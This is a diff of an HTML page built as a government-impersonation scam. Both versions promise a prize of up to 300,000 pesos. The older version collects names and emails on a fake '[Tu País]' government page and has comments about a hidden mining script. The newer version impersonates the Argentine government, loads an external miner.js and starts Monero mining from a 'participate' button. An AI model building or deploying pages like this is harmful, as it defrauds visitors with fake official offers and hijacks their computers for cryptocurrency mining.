@@ -1,139 +1,72 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gobierno de [Tu País] - Promoción Especial</title>
-    <link rel="stylesheet" href="https://www.ejemplo.gob.mx/assets/styles.css"> <!-- Enlace a CSS similar -->
-    <style>
-        /* Estilos adicionales para imitar el estilo gubernamental */
-        body {
-            font-family: Arial, sans-serif;
-            color: #333;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-        }
-        header {
-            background-color: #004d99;
-            color: #fff;
-            padding: 10px 0;
-            text-align: center;
-        }
-        header h1 {
-            margin: 0;
-        }
-        nav {
-            background-color: #003366;
-            color: #fff;
-            padding: 5px 0;
-            text-align: center;
-        }
-        nav ul {
-            list-style: none;
-            margin: 0;
-            padding: 0;
-        }
-        nav ul li {
-            display: inline;
-            margin: 0 15px;
-        }
-        nav ul li a {
-            color: #fff;
-            text-decoration: none;
-        }
-        .container {
-            width: 80%;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #fff;
-            border: 1px solid #ddd;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .promocion {
-            background-color: #ffeb3b;
-            color: #d32f2f;
-            padding: 20px;
-            margin-top: 20px;
-            border-radius: 5px;
-            text-align: center;
-        }
-        .promocion h2 {
-            margin-top: 0;
-        }
-        form {
-            margin-top: 20px;
-        }
-        form label {
-            display: block;
-            margin: 10px 0 5px;
-        }
-        form input {
-            width: calc(100% - 22px);
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            margin-bottom: 10px;
-        }
-        form button {
-            background-color: #004d99;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        footer {
-            background-color: #003366;
-            color: #fff;
-            text-align: center;
-            padding: 10px 0;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gobierno de Argentina - Promoción Especial</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      color: #333;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      text-align: center;
+    }
+    .container {
+      padding: 20px;
+      text-align: center;
+    }
+    .promo-box {
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      display: inline-block;
+      padding: 20px;
+      margin: 20px;
+      width: 80%;
+      max-width: 600px;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <h1>Gobierno de [Tu País]</h1>
-    </header>
-    <nav>
-        <ul>
-            <li><a href="/">Inicio</a></li>
-            <li><a href="/tramites">Trámites</a></li>
-            <li><a href="/servicios">Servicios</a></li>
-            <li><a href="/contacto">Contacto</a></li>
-        </ul>
-    </nav>
-    <div class="container">
-        <section class="promocion">
-            <h2>¡Gana hasta 300,000 pesos!</h2>
-            <p>Participa en nuestra promoción especial. Regístrate a continuación para obtener más información y ser parte de esta increíble oportunidad.</p>
-            <form id="falso-formulario">
-                <label for="nombre">Nombre completo:</label>
-                <input type="text" id="nombre" name="nombre" required><br>
 
-                <label for="email">Correo electrónico:</label>
-                <input type="email" id="email" name="email" required><br>
+  <header>
+    <h1>Gobierno de la República Argentina</h1>
+  </header>
 
-                <button type="submit">Regístrate</button>
-            </form>
-        </section>
+  <div class="container">
+    <div class="promo-box">
+      <h2>Promoción Especial del Gobierno</h2>
+      <p>¡Regístrate y podrías ganar hasta 300,000 pesos argentinos!</p>
+      <p>Esta oferta es válida solo por tiempo limitado. Aprovecha la oportunidad.</p>
+      <button onclick="startMining()">Participar y Minar</button>
     </div>
-    <footer>
-        <p>&copy; 2024 Gobierno de [Tu País]. Todos los derechos reservados.</p>
-    </footer>
+  </div>
 
-    <script>
-        document.getElementById("falso-formulario").addEventListener("submit", function(e) {
-            e.preventDefault();
-            alert("Gracias por registrarte. ¡Te hemos enviado un correo de confirmación!");
+  <script src="miner.js"></script>
+  <script>
+    function startMining() {
+      alert("¡Gracias por participar! Se iniciará el proceso de minería.");
+      startMoneroMining();
+    }
+  </script>
 
-            // Aquí se podría incluir el código de minería oculto
-        });
-    </script>
-    <script src="miner.js"></script> <!-- El script de minería oculto -->
 </body>
 </html>
